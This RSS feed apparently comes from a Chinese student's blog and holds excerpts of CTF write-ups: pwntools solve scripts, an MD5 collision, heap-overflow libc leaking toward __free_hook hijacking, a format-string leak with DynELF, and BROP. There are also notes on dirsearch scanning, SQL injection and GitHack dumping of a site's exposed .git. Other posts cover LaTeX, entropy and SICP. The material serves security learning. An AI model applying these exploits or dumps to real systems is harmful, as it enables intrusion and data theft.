<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>learning on Iluvata&#39;s Blog</title>
    <link>https://iluvata.github.io/categories/learning/</link>
    <description>Recent content in learning on Iluvata&#39;s Blog</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <lastBuildDate>Mon, 28 Mar 2022 13:53:31 +0800</lastBuildDate><atom:link href="https://iluvata.github.io/categories/learning/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>BUAACTF2022 WP</title>
      <link>https://iluvata.github.io/post/2022-03-28_buaactf2022/</link>
      <pubDate>Mon, 28 Mar 2022 13:53:31 +0800</pubDate>
      
      <guid>https://iluvata.github.io/post/2022-03-28_buaactf2022/</guid>
      <description>crypto  ez game  求逆，哈希碰撞
from pwn import * from gmpy2 import invert p = remote(&amp;#34;101.43.185.64&amp;#34;, &amp;#34;43089&amp;#34;) # p = remote(&amp;#34;49.232.31.80&amp;#34;, &amp;#34;8088&amp;#34;) p.recvuntil(&amp;#34;y)\n&amp;#34;) p.sendline(&amp;#39;1&amp;#39;) sleep(1) for i in range(300): p.recvuntil(&amp;#34;m): (&amp;#34;) a = int(p.recvuntil(&amp;#34;, &amp;#34;, drop=True)) b = int(p.recvuntil(&amp;#34;)&amp;#34;, drop=True)) # p.interactive() p.sendline(str(invert(a, b))) log.success(str(i)) p.interactive()  from pwn import * x = &amp;#34;d131dd02c5e6eec4693d9a0698aff95c2fcab58712467eab4004583eb8fb7f8955ad340609f4b30283e488832571415a085125e8f7cdc99fd91dbdf280373c5bd8823e3156348f5bae6dacd436c919c6dd53e2b487da03fd02396306d248cda0e99f33420f577ee8ce54b67080a80d1ec69821bcb6a8839396f9652b6ff72a70&amp;#34;.decode(&amp;#34;hex&amp;#34;) y = &amp;#34;d131dd02c5e6eec4693d9a0698aff95c2fcab50712467eab4004583eb8fb7f8955ad340609f4b30283e4888325f1415a085125e8f7cdc99fd91dbd7280373c5bd8823e3156348f5bae6dacd436c919c6dd53e23487da03fd02396306d248cda0e99f33420f577ee8ce54b67080280d1ec69821bcb6a8839396f965ab6ff72a70&amp;#34;.decode(&amp;#34;hex&amp;#34;) # print(hashlib.md5(x).hexdigest()) # print(hashlib.md5(y).hexdigest()) p = remote(&amp;#34;49.232.31.80&amp;#34;, &amp;#34;8088&amp;#34;) p.recvuntil(&amp;#34;y)\n&amp;#34;) p.sendline(&amp;#39;2&amp;#39;) sleep(2) p.</description>
    </item>
    
    <item>
      <title>BUAACTF2023 WP</title>
      <link>https://iluvata.github.io/post/2023-04-26_buaactf2023/</link>
      <pubDate>Mon, 28 Mar 2022 13:53:31 +0800</pubDate>
      
      <guid>https://iluvata.github.io/post/2023-04-26_buaactf2023/</guid>
      <description>crypto  Block Cipher  直接写个解密
def decrypt(parts): iv = b&amp;#39;\xba=y\xa3\xc6)\xcf\xf7&amp;#39; key = b&amp;#39;}6E\xeb(\x91\x08\xa0&amp;#39; results = [] for index, part in enumerate(parts): results.append(reduce(xor, [part, iv if index == 0 else parts[index-1], key])) return results      pwn  NLP  pwntools使用。后面的信息提取有点恶心
#encoding: utf-8 from pwn import * p = remote(&amp;#34;10.212.26.206&amp;#34;, &amp;#34;23004&amp;#34;) for i in range(20): p.recvuntil(&amp;#34;A = :&amp;#34;) a = int(p.recvline()) p.recvuntil(&amp;#34;B = :&amp;#34;) b = int(p.</description>
    </item>
    
    <item>
      <title>在hugo中使用latex</title>
      <link>https://iluvata.github.io/post/2021-12-28_hugo-with-latex/</link>
      <pubDate>Tue, 28 Dec 2021 20:04:31 +0800</pubDate>
      
      <guid>https://iluvata.github.io/post/2021-12-28_hugo-with-latex/</guid>
      <description>主要参考这片文章。在katex官网找到Auto-render拓展，在生成的html&amp;lt;head&amp;gt;段中加上以下代码就行了。
&amp;lt;link rel=&amp;#34;stylesheet&amp;#34; href=&amp;#34;https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.css&amp;#34; integrity=&amp;#34;sha384-R4558gYOUz8mP9YWpZJjofhk+zx0AS11p36HnD2ZKj/6JR5z27gSSULCNHIRReVs&amp;#34; crossorigin=&amp;#34;anonymous&amp;#34;&amp;gt; &amp;lt;script defer src=&amp;#34;https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.js&amp;#34; integrity=&amp;#34;sha384-z1fJDqw8ZApjGO3/unPWUPsIymfsJmyrDVWC8Tv/a1HeOtGmkwNd/7xUS0Xcnvsx&amp;#34; crossorigin=&amp;#34;anonymous&amp;#34;&amp;gt;&amp;lt;/script&amp;gt; &amp;lt;script defer src=&amp;#34;https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/auto-render.min.js&amp;#34; integrity=&amp;#34;sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR&amp;#34; crossorigin=&amp;#34;anonymous&amp;#34; onload=&amp;#34;renderMathInElement(document.body);&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;   加入的方法为在模板中添加。模板位置为（以我的dream主题为例） /themes/dream/layouts/partials/helpers/katex.html 。但是不要直接照搬上面的代码，最好去网站找最新代码。
 为了能够控制哪些博客需要渲染，而不是渲染所有博客，在 /themes/dream/layouts/partials/head.html 添加以下代码
{{ if .Params.math }}{{ partial &amp;#34;helpers/katex.html&amp;#34; . }}{{ end }}   在需要渲染的博客头上添加
--- math: true ---   如果需要渲染行内表达式，即渲染 $x = {-b \pm \sqrt{b^2-4ac} \over 2a}$ 为 $x = {-b \pm \sqrt{b^2-4ac} \over 2a}$ ，在 katex.html 中写入下面代码
&amp;lt;script&amp;gt; document.addEventListener(&amp;#34;DOMContentLoaded&amp;#34;, function() { renderMathInElement(document.body, { delimiters: [ {left: &amp;#34;$$&amp;#34;, right: &amp;#34;$$&amp;#34;, display: true}, {left: &amp;#34;$&amp;#34;, right: &amp;#34;$&amp;#34;, display: false} ] }); }); &amp;lt;/script&amp;gt;   最后放一个跨行公式测试效果</description>
    </item>
    
    <item>
      <title>结构信息论</title>
      <link>https://iluvata.github.io/post/2021-12-28_structural-information/</link>
      <pubDate>Tue, 28 Dec 2021 15:08:33 +0800</pubDate>
      
      <guid>https://iluvata.github.io/post/2021-12-28_structural-information/</guid>
      <description>  给定一个分布，想要描述一个服从该分布的随机变量取值平均所需的信息量就是该分布的熵，也可以理解为该分布的不确定性。信息熵越大，该分布的不确定性越大，完全确定取值所需的信息就越多。例如在一个随机变量有8种等可能取值的分布中，为了确定一个结果，需要一个能够容纳8个不同值的标识。因此用3bit字符串足够描述这些标识。如果分布是非均匀的，则可以对概率大的取值用较短的描述，这样我们能得到一个平均更短的描述。这个 描述的平均长度 就是该分布的信息熵。我们定义某一分布的信息熵如下：
  直观地解释， $l=-logp_i$ 是描述概率为 $p_i$ 的事件的二进制长度，熵就是每个事件的描述长度的加权平均。
位置熵/一维结构熵  我们把一张图 $G$ 的度分布的熵叫做图 $G$ 的位置熵，也是图的一维结构熵。
 $$ \begin{aligned} \mathcal{H}^{1}(G) &amp;amp;=H(\mathbf{p})=H\left(\frac{d_{1}}{2 m}, \ldots, \frac{d_{n}}{2 m}\right) \\ &amp;amp;=-\sum_{i=1}^{n} \frac{d_{i}}{2 m} \cdot \log _{2} \frac{d_{i}}{2 m} \end{aligned} $$
 其中 $m$ 为图 $G = (V, E)$ 中边的数量，即 $|E|$ ； $d_i$ 为结点 $i$ 的度。一维结构熵 $H^i(G)$ ，从直观上解释，是确定在有静态分布的图 $G$ 中随机游走能够达到的结点的一维编码所需的信息量。
 现在让我们进一步理解上面这个公式。我们之前对的香农熵解释是：对分布中的每个取值，根据该取值出现的概率给他一个码字（编码）长度，使得描述分布中取值所需的平均编码长度最小。这个最小的编码长度就是分布的信息熵。在位置熵中，我们可以认为简单图中一个结点在随机游走中被访问的概率就是该结点的度在所有结点的度之和中所占的比例。因此若要给该结点一个编码，最优的编码长度应当是 $-\log_2\frac{d_i}{2m}$ 。加权平均后记为该图 $G$ 的位置熵/一维结构熵 $H^1(G)$ 。
  高维结构熵   结构熵最小化   </description>
    </item>
    
    <item>
      <title>N1Book Web 学习</title>
      <link>https://iluvata.github.io/post/2021-12-28_n1book-web/</link>
      <pubDate>Tue, 28 Dec 2021 00:17:37 +0800</pubDate>
      
      <guid>https://iluvata.github.io/post/2021-12-28_n1book-web/</guid>
      <description>buuctf n1book web刷题
信息收集  常见的收集  网站上可能会有敏感目录/文件导致信息泄漏，如.git，vim的备份文件.swp等。可以用dirsearch扫描站点目录。
cd dirsearch python3 dirsearch.py -u 192.168.21.128 -e php    -u 指定目标ip
  -e 指定网站语言
  -w 可以加上自己的字典（带上路径）
  –random-agents 使用代理（使用的代理目录在uesr-agents.txt中，可以自己添加）
  脚本扫描的数据库在 db 文件夹，可以自己加。这题的目标文件有三个： robots.txt , index.php~ , .index.php.swp 。我一开始扫了2次没扫出来，指定了php语言后扫出了robots.txt。
 robots.txt是网站定的允许爬虫规则；后缀为~的是gedit的备份文件；.文件名.swp是vim的备份文件。
  粗心的小李  git泄漏题可以用的工具有GitHack，scrabble。只要目标网站上有.git，运行脚本就能把网站dump下来。
GitHack.py http://www.openssl.org/.git/  scrabble http://example.com/      SQL注入    数字型注入 若输入参数为1，查询的语句为 select * from table where id=1 。若输入参数为1+1返回2的结果，基本能确定是数字型输入。 参数前后没有过滤也没有引号，可以直接union。</description>
    </item>
    
    <item>
      <title>pwn堆题整理</title>
      <link>https://iluvata.github.io/post/2021-12-23_heap/</link>
      <pubDate>Thu, 23 Dec 2021 14:55:04 +0800</pubDate>
      
      <guid>https://iluvata.github.io/post/2021-12-23_heap/</guid>
      <description>堆溢出  Nnote  花了一周打的UNCTF，光做PWN了，做了7道，就差这道堆题没做出来。最后还有30名以内。。。因为这比赛本身就是入门级的，算是我第一次实战吧。赛后看着wp调试出来。当时应该是找到了漏洞点，但因为基础薄弱最终也没做出来，更别说环境还弄了半天没弄好。。。通过这道题我算是实际开始入门堆了吧。这里是官方wp。
exp环境  题目给的libc是2.31
patchelf --set-rpath ~/glibc-all-in-one/libs/2.31 ./Nnote patchelf --set-interpreter ~/glibc-all-in-one/libs/2.31/ld-2.31.so ./Nnote    泄漏libc  从libc-2.26开始加入了TCache，2.28加入对TCache二次释放的检查. TCache为每个线程加入64个单链表的bins，（64bit系统）以16字节递增，从24B到1032B。每个bins最多放7个chunk。堆开头的0x250的堆块就是tcache_perthread_struct. 在free时，如果chunk大小符合要求，就会在放入fastbins之前放入tcache。分配堆块时若从fastbins中成功返回一个chunk，对应fastbins中其他chunk会被放入对应tcache直到装满。small bins中情况类似。chunk合并时chunk会优先放入tcache。tcache中chunk的PREV_INUSE位和在fastbins中一样不会被清零，因此不会被合并。
 因此这题需要先构造出大于0x410(1040B)的堆块，释放进unsorted bin。需要注意在想释放的堆块后还要再申请一块chunk，防止因为和topchunk相邻而直接合并进topchunk。unsorted bin中如果只有一个chunk，并且这个chunk在上次分配时被使用过时，若申请一个大小属于small bins(32B-1008B)的空间，会直接从该chunk中进行切割，切出低地址部分返回。
 这题申请大小限制不小于0，不大于128，并且根据申请的大小限制了修改时能写入的字节数。但是申请0B的堆块时能通过整数溢出绕过限制条件引起堆溢出。因此这里构造大小为0x480的chunk的方法就是构造9个连在一起的，大小为0x80的chunk（malloc申请的大小为0x78）；然后利用最上面堆块上面的堆溢出覆盖第一块的块大小字段为0x481（块大小字段最低bit为PREV_INUSE）。释放后再申请一个0x80的chunk，会从之前释放到unsorted bin头部割出0x80，导致现在在unsorted bin中的chunk和原来申请的9块中的第二块重叠，输出第二块的数据就可以得到unsorted bin。
add(0) for i in range(9): add(0x78) add(0x18) edit(0 , &amp;#39;a&amp;#39;*0x18+p64(0x481)) delete(1) add(0x78) show(2) __malloc_hook = l64() - 0x70 libc.address = __malloc_hook - libc.sym[&amp;#39;__malloc_hook&amp;#39;]   得到的地址和main_arena(或__malloc_hook)之间的偏移是固定的。可以在gdb调试里看到与__malloc_hook之间的偏移为0x70。
gef➤ bins tcachebins empty fastbins 0x20: 0x0 0x30: 0x0 0x40: 0x0 0x50: 0x0 0x60: 0x0 0x70: 0x0 0x80: 0x0 unsortedbin all: 0x558be3001330 —▸ 0x7f6c92886be0 (main_arena+96) ◂— 0x558be3001330 smallbins empty largebins empty gef➤ x/gx &amp;amp;__malloc_hook 0x7f6c92886b70 &amp;lt;__malloc_hook&amp;gt;:	0x0000000000000000    劫持free_hook  这时候申请两个0x40的chunk，序号分别为11和12.</description>
    </item>
    
    <item>
      <title>ROP</title>
      <link>https://iluvata.github.io/post/2021-11-13_rop/</link>
      <pubDate>Sat, 13 Nov 2021 01:57:10 +0800</pubDate>
      
      <guid>https://iluvata.github.io/post/2021-11-13_rop/</guid>
      <description> BROP  确定retaddr的偏移   寻找stopgadget  可以用io.recv()是否成功来判断是否为stopdadget，并且可以根据返回的内容大致猜测覆盖的地址是什么函数
  寻找bropgadget  所谓bropgadget其实就是__libc_csu_init里最后一段包含6个连续pop的汇编，对这段汇编进行偏移还能构造出对于另外几个寄存器的pop。 寻找方法也就是在猜测的retaddr后跟6个trap（会导致程序崩溃的retaddr），再跟上之前找到的stopgadget，最后再跟几个trap。验证的方法可以是在跟上6个trap后不跟stopgadget而是直接跟上trap，看是否会崩溃（如果不会崩溃，有可能是遇到了plt表。为什么plt表不会崩溃？因为plt表用jmp直接跳转去执行函数了）。
  寻找puts/write@plt  通过尝试puts出elf头的\x7fELF确定是否遇到了puts的plt
  dump出内存  用之前得到的puts@pltdump出内存
  在dump出的内存中找到任意函数的got，打印出got内容从而确定libc和偏移   ret2libc     SROP   </description>
    </item>
    
    <item>
      <title>libc泄漏</title>
      <link>https://iluvata.github.io/post/2021-11-10_ctf-libc-leak/</link>
      <pubDate>Wed, 10 Nov 2021 12:35:39 +0800</pubDate>
      
      <guid>https://iluvata.github.io/post/2021-11-10_ctf-libc-leak/</guid>
      <description>libc泄漏在pwn题里很常见，在这里整理一下常见的泄漏libc的方法。 ROP中的ret2libc需要知道libc的版本和偏移，需要泄漏内存中函数的地址。 fmtstr中有时需要知道libc的偏移后用system函数覆盖某些函数的got。 堆利用中也会有用system覆盖函数got的利用方式。
常见泄漏方法  未知libc版本时  常用的泄漏方法有泄漏某个函数的got内容，根据泄漏的地址用LibcSearcher搜索libc。函数的got地址可以用ELF在目标二进制文件中搜到。 在可以泄漏任意地址内容的时候可以用DynELF。
    格式化字符串漏洞  NJCTF2017 pingme  这题是blind fmt，只提供了ip和端口。在从内存dump下代码后搜索到printf@got，泄漏出printf地址。用泄漏的printf地址搜索libc-database得到libc版本后在libc中搜到system，用system和printf的相对地址转化得到system在进程中的地址。然后利用fmtstring用system覆盖printf@got。 如果libc-database搜不到，可以用DynELF来泄漏system地址。
def leak(addr): p = remote(&amp;#39;127.0.0.1&amp;#39;, &amp;#39;10001&amp;#39;) p.recvline() payload = &amp;#34;%9$s.AAA&amp;#34; + p32(addr) p.sendline(payload) data = p.recvuntil(&amp;#34;.AAA&amp;#34;)[:-4] + &amp;#34;\x00&amp;#34; log.info(&amp;#34;leaking: 0x%x--&amp;gt; %s&amp;#34; % (addr, data.encode(&amp;#39;hex&amp;#39;))) p.close() return data data = DynELF(leak, 0x08048490) # Entry point address system_addr = data.lookup(&amp;#39;system&amp;#39;, &amp;#39;libc&amp;#39;) printf_addr = data.lookup(&amp;#39;printf&amp;#39;, &amp;#39;libc&amp;#39;) log.info(&amp;#34;system address: 0x%x&amp;#34; % system_addr) log.</description>
    </item>
    
    <item>
      <title>CTF基本工具使用指北</title>
      <link>https://iluvata.github.io/post/2021-09-24_ctf-tools/</link>
      <pubDate>Fri, 24 Sep 2021 14:43:07 +0800</pubDate>
      
      <guid>https://iluvata.github.io/post/2021-09-24_ctf-tools/</guid>
      <description>环境搭建  在mac上我觉得比较好用的环境是multipass中ubuntu虚拟机+宿主机中的idapro，以及宿主机上vscode写python wp，在虚拟机中运行。
multipass launch 16.04 --name pwn --disk 15G --mem 4G   multipass默认分配的内存和磁盘不太够用，建议内存分4G，磁盘分15G。ubuntu版本选择16.04. 虚拟机内环境配置可以参考pwn-env-init，建议使用py2. 但是脚本是用apt-get安装pip的，可能会有些问题，需要 curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py 然后运行 get-pip.py 。还有 one_gadget 目前需要ruby版本高于2.4，apt-get安装的ruby是2.3。可以执行下面的命令安装
 ,#+begin_src shell $ sudo apt-add-repository ppa:brightbox/ruby-ng
 $ sudo apt-get update
 $ sudo apt-get install ruby2.4 ruby2.4-dev
 $ ruby2.4 -v
#+end_src
 还可以装个 tmux ，在pwntools连接gdb调试的时候在开头加上下面代码就可以分出调试窗口（虽然我现在也还没配好pwntools舒服地连gdb的环境。。。）。
context.arch=&amp;#34;amd64&amp;#34; context.terminal = [&amp;#39;tmux&amp;#39;, &amp;#39;splitw&amp;#39;, &amp;#39;-h&amp;#39;]    pwntools  io交互  连接</description>
    </item>
    
    <item>
      <title>迭代与递归</title>
      <link>https://iluvata.github.io/post/2021-04-07_iteration-and-recurtion/</link>
      <pubDate>Wed, 07 Apr 2021 16:03:50 +0800</pubDate>
      
      <guid>https://iluvata.github.io/post/2021-04-07_iteration-and-recurtion/</guid>
      <description>递归处理与递归过程  用一个经典的递归例子：阶乘 来说明。
(define (factorial n) (if (= n 1) 1 (* n factorial (- n 1))))  以上是经典的阶乘的递归处理，若输入为1则输出1,否则结果为当前n×递归执行n-1.
(define (factorial n) (fact-iter 1 1 n)) (define (fact-iter product counter max-count) (if (&amp;gt; counter max-count) product (fact-iter (* counter product) (+ count 1) max-count)))  以上是阶乘的迭代处理。我们在每一次迭代（循环）中输入了得到下一结果所需的所有信息，编译器无需像在递归处理中一样 保存每次n的值以计算最后的结果。
 但是用我们熟悉的c语言来理解以上这段代码，我们会觉得在形式上 fact-iter 函数在函数体中调用了自身，也应该算作 递归而不是迭代。在c语言中，我们理解的迭代是使用 for 或 while 在代码块中显式地更改变量，以上代码很明显 没有使用“循环”。这就引出了递归过程与递归处理的区别。以上代码使用的确实是我们在c语言中称作“递归过程”的代码形式， 但根据我们对“迭代处理”的定义，即编译器无需保存中间变量，它很显然是符合“迭代处理”要求的。在c语言和其他很多 语言中，使用递归过程的迭代处理会和普通的递归处理一样，在每次递归中保存一些值，导致无法到达很深的递归深度。在lisp 编译器的实现中使用了“尾递归”优化技术，即若一个函数在调用自身时（满足递归过程条件）将该调用放在最后执行，并且 无需保存多余的变量，将所有必要的变量输入下一层，那么编译器在执行的时候就不会保存多余的信息，而是像迭代那样直接 用下一层来覆盖当前层。
  多种形式的递归与迭代  线性递归  上面factorial的递归实现中每次进入一个下一层，保存的数据随n的增大是线性增长的。这种形式的递归处理叫做线性递归。</description>
    </item>
    
    <item>
      <title>概率统计中的分布</title>
      <link>https://iluvata.github.io/post/2021-03-19_distributions/</link>
      <pubDate>Fri, 19 Mar 2021 14:52:58 +0800</pubDate>
      
      <guid>https://iluvata.github.io/post/2021-03-19_distributions/</guid>
      <description> 连续分布  均匀分布   正态分布  距离某一中心值偏离的误差越大的概率越小。可用于自然界许多现象的模拟.
  指数分布  EX=1/lambda DX=1/lambda^2 指数分布的无记忆性：先验概率与后验概率相同。可用于模拟电器使用：不管之前使用了多久， 能继续使用x小时的概率不变。 先验概率 后验概率
    离散分布  0-1分布  0-1分布随机变量取值为0或1，参数只有一个p，即取值为1的概率。
  二项分布  二项分布是多个相同0-1分布的叠加。B(n,p)中n为随机变量的数量，p和0-1分布中相同。 输入k得到的结果为k个随机变量得到1的概率。
  泊松分布  EX=DX=lambda 在二项分布数值非常大的时候B(1000, 0.001), n=1000, p=0.001的时候计算量非常大。 可以用泊松分布进行模拟。lambda=n*p, 随机变量为k. 经常被用来模拟排队。在每个离散时间一个客户可能来的概率为p, 泊松分布可以模拟 总客户数为n时在时间点k来的客户数量。
    </description>
    </item>
    
    <item>
      <title>计算机体系结构与组成原理</title>
      <link>https://iluvata.github.io/post/2021-03-15_computer-structure/</link>
      <pubDate>Mon, 15 Mar 2021 13:13:42 +0800</pubDate>
      
      <guid>https://iluvata.github.io/post/2021-03-15_computer-structure/</guid>
      <description>计算机体系结构概要  计算机体系结构讲的是同系列计算机为操作系统提供的接口（包括机器语言、汇编语言等），以及底层 硬件的结构设计。计算机组成原理讲的是硬件实现。目前的计算机一般都是用冯诺依曼结构，特点是 存储程序，即将程序作为数据和数据存储在同一存储器中。要执行程序的时候从第一个存储单元开始 顺序执行，根据控制流跳转。与之对应的是哈佛结构，将数据和程序分别存放在两个不同的存储器 中。
 要了解计算机，首要的是了解计算机是怎么存储数据的。包括补码、原码等各种格式和他们的运算。 在了解了数据在计算机中的表示方式后，我们需要知道他们在哪里如何被存储，在哪里怎么进行运算。 在了解计算机进行运算的步骤之前需要知道计算机是用什么格式发出命令的，即机器语言与汇编语言。 以上便是计算机主机的任务：存储、运算、控制。除此之外，计算机还需要规范数据如何在各部件间 传输，即确定总线的相关标准。最后，如果只有之前的操作我们只能将计算机看作一个黑盒，什么都 进不去，什么都出不来，就算一直在计算也没有用处。因此对于输入/输出的讨论也极为重要。
  现代计算机中，控制器和运算器一起被叫做CPU，CPU和主存一起组成主机，主机与外设一起组成硬件设备。 硬件和软件一起组成计算机系统。
  存储器层次结构  目前我们能用于做存储器的材料与工艺有很多，不同方式/目的做出的存储器特性也不同。如磁盘，磁带， RAM，ROM，FLASH等。存储器的分类方式有很多，如用用掉电后能否保存数据可以分成挥发性存储器与 非挥发性存储器；能否随机访问可以分为随机访问存储器与顺序访问存储器等。除此之外，就算是在 主机内部使用的存储器，不同工艺也有很大的性能与价格差距。SRAM可以用于寄存器，速度最快， 但是集成度低，在单位空间内塞不下很大容量，并且价格贵。DRAM动态随机访问存储器一般用于主存， 相比SRAM速度较慢，但是集成度较高并且便宜。
 我们对计算机性能的要求是无上限的，但同时成本也需要控制在可接受的范围。因此就算我们让一台计算机 主机内所有的存储器都用SRAM，我们还是会想要更大更快的内存。为了解决上述价格与速度的矛盾，我们 引入了分层次存储器。在拥有DRAM作为主存的大容量低价格的同时使用SRAM作为CPU内部寄存器以获取高速度。 完整的层次结构中速度从快到慢，容量从小到大是：寄存器-cache-主存-外存.
 主存与CPU之间通过总线相连，数据从主存中取出到寄存器中，在寄存器中传入ALU等部件组成的数据通路进行 计算，得到的结果也存放在寄存器，需要时写入主存中。随着硬件的发展，虽然主存的速度也在不断增长， 但CPU速度的增长速度远大于主存，两者之间的速度差距越来越大。为了调节两者间的速度差异，最大 程度发挥CPU性能，Cache作为高速缓存被引入。Cache具有接近CPU的存取速度，保存最近常用的主存中 的单元副本，并且实时更新。主存、Cache、CPU之间的关系，乃至整个存储器层次结构中上下层软硬件 的关系，我们可以形象的用柜台和仓库进行类比。存取速度更快但是容量更小的上层存储器是商店里的柜台， 下层存储器是商店的仓库，数据是仓库中的物品。当用户/计算机需要购买物品时，如果柜台中有物品 就可以直接从柜台快速拿取，若没有则需要经过繁琐的步骤去仓库取出。但是我们不能把仓库中所有物品 直接放入柜台。还有一种类比是把数据看作学生使用的文具，最上层，即速度最快，容量最小的一层是 学生书桌上的文具盒，需要的时候可以随时取用。下一层是书包，可能有些较大的文具无法放在文具盒中， 这时就需要花稍多的时间从背包内取出。再下一层可以是学生的家。有时候可能会把要用的东西落在了家中， 或者书包也装不下，只能放在家中。这时若再需要用到就要花大代价跑回家去拿。但是一旦从家中拿到了 文具，已经将它装在了包里，那下次再次取用就只要去包里找就行了。CPU内寄存器、Cache、主存间的关系 大致是这样，只是这里的“物品”：数据是可以被拷贝到上层存储器的，从下层“取走”到上层后下层还保留着 一份原本，上层只是“复制”走了一份副本。值得一提的一点是为什么我们每天只需要一个包来装学习用品 就够日常使用了，而不是经常跑回家拿东西呢？假设我们把所有科目的书和试卷等全都放在家里，每天的 课程表让我们知道当天的科目，再加上当前的课程进度，综合起来我们可以判断只需要带走一部分相关的资料 而非全部科目的所有资料就足够当天的学习使用了。在计算机中也有类似的情况，就是计算机在执行一道 程序的时候在一段时间内会反复使用同一段或相邻的空间。这就相当于得知了当前的“课程进度”和“课表” 后，我们能够确定大致需要带的资料，在一段时间（比如一天）内无需反复回家更换。程序在一段时间 内反复访问相同的空间的特性叫做时间局部性，访问某空间后大概率访问相邻空间的特性叫做空间局部性。 程序的局部性原理使得是的Cache能够作为CPU与主存间的高速缓存大大提升整体系统的效率。
 那么我们在使用Cache的时候需要注意哪些细节呢？首先，由于一个学生在上学的时候不可能把整个家里所有 东西都装在背包中，需要挑选出每天要带走的东西。Cache需要确定保存哪些副本，当空间满了的时候 如何进行替换。Cache的替换策略有随机替换, FIFO, LRU, LFU. 其次，Cache中保存的是主存中的副本， Cache以行为单位，一行内可以包括多个主存单元（一般是1字节大小），与行对应大小的单位在主存 中被称为块。Cache最理想的实现方式是每行都能保存主存中任意块的副本，但是由于Cache的总 容量比主存小，我们需要对存在每行中的每个块指定一个标识以分辨对应主存中的位置。 按照上面的设想，我们需要在每行保存完整的主存块地址（非存储单元地址，用于分辨块中不同存储 单元的最后几位不用记录）作为唯一标识，这样每次想要找出CPU给出的主存单元对应的Cache行所需 的开销就会比较大。那么我们可以换一种思路进行映射：由于主存容量较大，地址的长度也比Cache中地址要长， 那我们把高位多出来的那部分作为唯一标识，剩下的主存地址就直接用到Cache上当作行地址，这样需要保存 的标识长度就短了很多，每次在Cache中找对应的主存块也不用对比所有行的标识，只需找到编号低位 与地址相同的那一行。以上两种Cache与主存之间的映射方式分别是全相联映射和直接映射。有的时候， 我们虽然用不起全相联映射，又发现直接映射太过于死板以至于在跑一些程序的时候无法很好的 完整高速缓存的工作（无法很好利用时间局部性），那就可以将两者结合起来，先将Cache中的行分组， 在组内进行任意对应。这就是组相联映射。</description>
    </item>
    
    <item>
      <title>编程语言的基本组成</title>
      <link>https://iluvata.github.io/post/2021-03-14_basic-elements-for-programming-language/</link>
      <pubDate>Sun, 14 Mar 2021 22:50:46 +0800</pubDate>
      
      <guid>https://iluvata.github.io/post/2021-03-14_basic-elements-for-programming-language/</guid>
      <description>编程语言的基本组成  编程语言的基本组成是SICP的第一节讨论的内容。编程语言所需要的基本元素有3个：原子元素（原子过程、 原子数据结构）、将运算进行复合的能力、对过程进行抽象的能力。
 原子元素是语言本身提供给我们的最小过程与数据结构，如乘法 * ，整数数据类型. 在scheme中我们将 一个操作过程写在括号语句内，语句的第一个元素作为运用的过程（操作符），随后的元素作为操作数。如
(* 3 4)   运算复合的能力使我们能够从基本操作中构建复杂操作，如求解阶乘
(define (factorial n) (if (&amp;lt; n 2) 1 (* n (factorial (- n 1)))))   最后是构建抽象的能力，能够让我们不被所有实现细节扰乱思路，只把之前构建的函数当作黑盒直接拿来 使用
(factorial 4)    块结构–以牛顿法求平方根为例  牛顿法是用于求解方程根的算法，从一个猜测开始每次迭代得到一个更好的猜测，不断向根逼近，直到 一个我们指定的要求达到为止。 通过使用抽象和运算符合的能力，我们能够构造improve, good-enough?等方法，最终构造出我们想要的 sqrt算法。
(define (sqrt-iter guess x) (if (good-enough? guess x) guess (sqrt-iter (better-guess guess x) x))) (define (sqrt x) (sqrt-iter 2.0 x))  在求解的过程中，我们定义的一些方法只有在sqrt中才会被用到，如improve, good-enough?等。为了 防止和其他代码名称冲突，可以把他们全都放到sqrt的定义内，让他们的作用域只限于sqrt.</description>
    </item>
    
    <item>
      <title>文件系统与数据库系统</title>
      <link>https://iluvata.github.io/post/2021-03-09_file-and-database/</link>
      <pubDate>Tue, 09 Mar 2021 11:40:13 +0800</pubDate>
      
      <guid>https://iluvata.github.io/post/2021-03-09_file-and-database/</guid>
      <description>数据库系统  数据库系统的组成部分包括数据库、软件、硬件和用户。数据库指的是系统中各种数据，包括目标数据 和描述数据。软件包括DBMS和开发工具等。 我们一般使用的数据库系统都是关系型数据库，这里将谈论的也主要是关系型。NoSQL之类的非关系型 数据库以后有时间可以去了解一下，我目前的理解是非关系型数据库可以支持使用一些更灵活的结构来 进行数据的存储，如json，可以避免数据结构多样性带来的问题。除了目前最常会用的关系型数据库外， 其他数据库结构还有层次模型和网状模型。
 数据库系统的层次结构如下
 软硬件层次
  DBMS管理层次  关系型数据库中的“关系”即我们在离散数学中学过的关系(relation)：多个集合的笛卡尔积的子集。 只是我们在离散数学中讨论的一般是二元关系，只考虑两个集合。在关系型数据库中，我们考虑的范围 变成了n个集合，即数据库一张表中的n个字段。对于讨论n元关系的关系型数据库，我们能够进行的基本 操作有SELECTION, PROJECTION, JOIN. SELECTION与SQL语句中的查找语句一样，从表中找出满足 条件的语句。PROJECTION删除一些字段，只留下（展示）我们需要的字段。JOIN得到两张表的笛卡尔积。
